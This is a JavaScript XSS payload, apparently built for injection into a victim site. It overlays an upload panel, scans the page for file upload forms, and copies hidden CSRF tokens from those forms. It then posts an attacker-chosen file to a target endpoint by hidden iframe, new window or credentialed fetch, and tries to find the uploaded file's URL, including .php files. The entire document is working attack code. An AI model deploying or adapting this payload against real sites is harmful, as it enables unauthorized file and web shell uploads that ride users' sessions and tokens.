document.write(`
<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
background:#1e1e1e;border:3px solid #00ff00;padding:20px;z-index:999999;
width:500px;font-family:monospace;color:#00ff00;box-shadow:0 0 20px #000;">
    
    <h3>📁 XSS File Uploader (Cross-Origin)</h3>
    
    <!-- Step 1: Scan for upload endpoint -->
    <button onclick="scanForms()" style="background:#00ff00;color:#000;padding:8px;margin:5px">🔍 Scan Forms</button>
    <button onclick="debugCORS()" style="background:#ffff00;color:#000;padding:8px;margin:5px">🌐 Test CORS</button>
    <div id="scanResult" style="background:#000;padding:5px;margin:5px;font-size:12px;max-height:100px;overflow:auto;">Ready</div>
    
    <!-- Step 2: Upload URL and field name -->
    <input id="uploadUrl" placeholder="Upload URL (full URL including https://)" value="https://target-server.com/upload.php" style="width:100%;margin:5px 0;padding:5px;background:#333;color:#0f0;border:1px solid #0f0;">
    <input id="fieldName" placeholder="Field name" value="file" style="width:100%;margin:5px 0;padding:5px;background:#333;color:#0f0;border:1px solid #0f0;">
    
    <!-- Step 3: SELECT FILE FROM YOUR LAPTOP -->
    <div style="border:1px solid #00ff00;padding:10px;margin:10px 0;">
        <strong>📂 Select file from your laptop:</strong>
        <input type="file" id="localFile" style="margin:10px 0;color:#00ff00;width:100%;">
        <div id="fileInfo" style="font-size:12px;"></div>
    </div>
    
    <!-- Step 4: Upload buttons -->
    <div style="display:flex;gap:5px;margin:10px 0;">
        <button onclick="uploadViaForm()" style="background:#00ff00;color:#000;padding:10px;flex:1;font-weight:bold;">🚀 Upload (Form Method)</button>
        <button onclick="uploadViaFetch()" style="background:#ffaa00;color:#000;padding:10px;flex:1;font-weight:bold;">🌐 Upload (Fetch - CORS)</button>
    </div>
    <button onclick="uploadDirect()" style="background:#ff00ff;color:#fff;padding:10px;width:100%;font-weight:bold;margin-top:5px;">📤 Upload (Direct Form Submit)</button>
    
    <!-- Status -->
    <div id="status" style="background:#000;padding:10px;margin-top:10px;max-height:200px;overflow:auto;font-size:12px;">Ready</div>
    
    <!-- Tiny text for note -->
    <div style="font-size:10px;color:#666;margin-top:5px;">⚠️ If upload fails, check console (F12) for errors</div>
</div>
`);

// File selection preview
document.getElementById('localFile').addEventListener('change', function(e) {
    const file = e.target.files[0];
    if(file) {
        document.getElementById('fileInfo').innerHTML = 
            `✅ Selected: ${file.name} (${(file.size/1024).toFixed(2)} KB) | Type: ${file.type || 'unknown'}`;
    } else {
        document.getElementById('fileInfo').innerHTML = '';
    }
});

// Scan for upload forms on the current page
window.scanForms = function() {
    let results = '🔍 Scanning forms...<br>';
    let found = 0;
    
    document.querySelectorAll('form').forEach((f, index) => {
        const fileInput = f.querySelector('input[type="file"]');
        if(fileInput) {
            found++;
            const action = f.action || '[same page]';
            const method = f.method || 'GET';
            const enctype = f.enctype || 'application/x-www-form-urlencoded';
            results += `✅ Form #${index}: action="${action}" method="${method}" enctype="${enctype}" field="${fileInput.name}"<br>`;
            
            // Auto-fill if found
            if(found === 1) {
                document.getElementById('uploadUrl').value = action || '/upload.php';
                document.getElementById('fieldName').value = fileInput.name || 'file';
            }
        }
    });
    
    if(found === 0) {
        results += '❌ No file upload forms found on this page<br>';
    }
    
    document.getElementById('scanResult').innerHTML = results;
};

// Debug CORS
window.debugCORS = function() {
    const url = document.getElementById('uploadUrl').value;
    const status = document.getElementById('status');
    
    if(!url) {
        alert('Please enter a URL first');
        return;
    }
    
    status.innerHTML = `🌐 Testing CORS for ${url}...<br>`;
    
    // Test with OPTIONS request
    fetch(url, {
        method: 'OPTIONS',
        mode: 'cors',
        headers: {
            'Access-Control-Request-Method': 'POST',
            'Access-Control-Request-Headers': 'content-type'
        }
    })
    .then(response => {
        const allowOrigin = response.headers.get('access-control-allow-origin');
        status.innerHTML += `✅ Server reachable<br>`;
        status.innerHTML += `🔓 CORS Headers: ${allowOrigin ? 'Allow-Origin: ' + allowOrigin : 'No CORS headers'}<br>`;
        
        if(allowOrigin === '*' || allowOrigin === window.location.origin) {
            status.innerHTML += `✅ CORS is enabled! Fetch should work.<br>`;
        } else {
            status.innerHTML += `⚠️ CORS not properly configured. Use Form method instead.<br>`;
        }
    })
    .catch(error => {
        status.innerHTML += `❌ CORS Error: ${error.message}<br>`;
        status.innerHTML += `⚠️ This is normal for cross-origin. Use Form method.<br>`;
    });
};

// METHOD 1: Form submission with proper multipart encoding - PRESERVES FILENAME
window.uploadViaForm = function() {
    const url = document.getElementById('uploadUrl').value;
    const fieldName = document.getElementById('fieldName').value;
    const fileInput = document.getElementById('localFile');
    
    if(!fileInput.files[0]) {
        alert('Please select a file first!');
        return;
    }
    
    const status = document.getElementById('status');
    const file = fileInput.files[0];
    
    status.innerHTML = `📤 Submitting form to ${url}...<br>`;
    status.innerHTML += `📁 File: ${file.name} (${(file.size/1024).toFixed(2)} KB)<br>`;
    status.innerHTML += `🔑 Field name: ${fieldName}<br>`;
    status.innerHTML += `🔧 Using multipart/form-data encoding<br>`;
    
    // Create a unique ID for this upload
    const uploadId = 'upload_' + Date.now();
    
    // Create hidden iframe to catch response
    const iframe = document.createElement('iframe');
    iframe.name = uploadId;
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    
    // Create form with CORRECT multipart encoding
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = url;
    form.enctype = 'multipart/form-data';  // CRITICAL for file uploads
    form.target = uploadId;
    
    // Instead of cloning the file input, we'll move the original one
    // But we need to detach it from its current position first
    const parent = fileInput.parentNode;
    const nextSibling = fileInput.nextSibling;
    
    // Remove from current position and add to form
    fileInput.remove();
    fileInput.name = fieldName; // Ensure correct field name
    fileInput.style.display = 'none'; // Hide it
    form.appendChild(fileInput);
    
    // Add CSRF tokens from any existing forms
    document.querySelectorAll('form input[type="hidden"]').forEach(input => {
        if(input.name) {
            const hidden = document.createElement('input');
            hidden.type = 'hidden';
            hidden.name = input.name;
            hidden.value = input.value;
            form.appendChild(hidden);
        }
    });
    
    // Add iframe load handler
    iframe.onload = function() {
        try {
            // Try to read iframe content (may fail due to cross-origin)
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            const response = iframeDoc.body.innerHTML;
            status.innerHTML += `✅ Upload completed!<br>`;
            status.innerHTML += `📄 Response: ${response.substring(0, 200)}...<br>`;
            
            // Try to extract file URL
            const match = response.match(/(https?:\/\/[^\s"']+\.(php|html?|jpg|png|gif|txt|js|css))/i);
            if(match) {
                status.innerHTML += `🔗 File URL: <a href="${match[0]}" target="_blank" style="color:#0f0;">${match[0]}</a><br>`;
            }
        } catch(e) {
            // Cross-origin iframe - can't read content
            status.innerHTML += `✅ Form submitted successfully!<br>`;
            status.innerHTML += `💡 Check the target server to see if file was uploaded.<br>`;
        }
        
        // Clean up iframe, but restore file input
        setTimeout(() => {
            if(document.body.contains(iframe)) document.body.removeChild(iframe);
            
            // Restore file input to original position
            if(parent) {
                if(nextSibling) {
                    parent.insertBefore(fileInput, nextSibling);
                } else {
                    parent.appendChild(fileInput);
                }
            } else {
                document.body.appendChild(fileInput);
            }
            fileInput.style.display = 'block';
        }, 1000);
    };
    
    // Handle iframe error
    iframe.onerror = function() {
        status.innerHTML += `⚠️ Form submitted but couldn't read response<br>`;
    };
    
    // Submit form
    document.body.appendChild(form);
    
    // Small delay to ensure everything is ready
    setTimeout(() => {
        form.submit();
        status.innerHTML += `⏳ Form submitted, waiting for response...<br>`;
        
        // Remove form but keep iframe
        setTimeout(() => {
            if(document.body.contains(form)) document.body.removeChild(form);
        }, 100);
    }, 100);
};

// METHOD 2: Direct form submission (opens in new window) - PRESERVES FILENAME
window.uploadDirect = function() {
    const url = document.getElementById('uploadUrl').value;
    const fieldName = document.getElementById('fieldName').value;
    const fileInput = document.getElementById('localFile');
    
    if(!fileInput.files[0]) {
        alert('Please select a file first!');
        return;
    }
    
    const status = document.getElementById('status');
    const file = fileInput.files[0];
    
    status.innerHTML = `📤 Opening upload form in new window...<br>`;
    status.innerHTML += `📁 File: ${file.name} will be uploaded with original filename<br>`;
    
    // Create form with proper multipart encoding
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = url;
    form.enctype = 'multipart/form-data';
    form.target = '_blank'; // Opens in new tab/window
    
    // Move the original file input (preserves filename)
    const parent = fileInput.parentNode;
    const nextSibling = fileInput.nextSibling;
    
    fileInput.remove();
    fileInput.name = fieldName;
    form.appendChild(fileInput);
    
    // Add hidden fields
    document.querySelectorAll('form input[type="hidden"]').forEach(input => {
        if(input.name) {
            const hidden = document.createElement('input');
            hidden.type = 'hidden';
            hidden.name = input.name;
            hidden.value = input.value;
            form.appendChild(hidden);
        }
    });
    
    // Submit form
    document.body.appendChild(form);
    form.submit();
    
    // Restore file input
    if(parent) {
        if(nextSibling) {
            parent.insertBefore(fileInput, nextSibling);
        } else {
            parent.appendChild(fileInput);
        }
    } else {
        document.body.appendChild(fileInput);
    }
    fileInput.style.display = 'block';
    
    // Clean up form
    document.body.removeChild(form);
    
    status.innerHTML += `✅ Form opened in new tab/window<br>`;
    status.innerHTML += `💡 Complete the upload there<br>`;
};

// METHOD 3: Fetch API (Only works if CORS is enabled) - PRESERVES FILENAME
window.uploadViaFetch = async function() {
    const url = document.getElementById('uploadUrl').value;
    const fieldName = document.getElementById('fieldName').value;
    const fileInput = document.getElementById('localFile');
    
    if(!fileInput.files[0]) {
        alert('Please select a file first!');
        return;
    }
    
    const status = document.getElementById('status');
    const file = fileInput.files[0];
    
    status.innerHTML = `🌐 Trying fetch upload to ${url}...<br>`;
    status.innerHTML += `📁 File: ${file.name} (original filename preserved)<br>`;
    status.innerHTML += `⚠️ This only works if target server has CORS enabled!<br>`;
    
    const formData = new FormData();
    formData.append(fieldName, file); // This preserves the original filename
    
    // Add any existing form data
    document.querySelectorAll('form input[type="hidden"]').forEach(input => {
        if(input.name) formData.append(input.name, input.value);
    });
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData,
            mode: 'cors',
            credentials: 'include'
        });
        
        status.innerHTML += `📡 Response status: ${response.status} ${response.statusText}<br>`;
        
        const text = await response.text();
        status.innerHTML += `📄 Response: ${text.substring(0, 300)}...<br>`;
        
        if(response.ok) {
            status.innerHTML += `✅ Upload successful via Fetch!<br>`;
        } else {
            status.innerHTML += `❌ Upload failed. Try Form method instead.<br>`;
        }
    } catch(error) {
        status.innerHTML += `❌ Fetch error: ${error.message}<br>`;
        status.innerHTML += `💡 This is a CORS error. Use the "Form Method" button instead.<br>`;
    }
};

// Test server connection
window.testServer = function() {
    const url = document.getElementById('uploadUrl').value;
    const status = document.getElementById('status');
    
    status.innerHTML = `Testing connection to ${url}...<br>`;
    
    // Try a simple HEAD request
    fetch(url, { method: 'HEAD', mode: 'no-cors' })
        .then(() => {
            status.innerHTML += `✅ Server is reachable<br>`;
        })
        .catch(error => {
            status.innerHTML += `❌ Cannot reach server: ${error.message}<br>`;
        });
};

// Add keyboard shortcut (Ctrl+Enter) to upload
document.addEventListener('keydown', function(e) {
    if(e.ctrlKey && e.key === 'Enter') {
        e.preventDefault();
        uploadViaForm();
    }
});

// Auto-scan when page loads
setTimeout(scanForms, 1000);

// Welcome message
console.log('🚀 File Uploader loaded. Use Ctrl+Enter to upload');
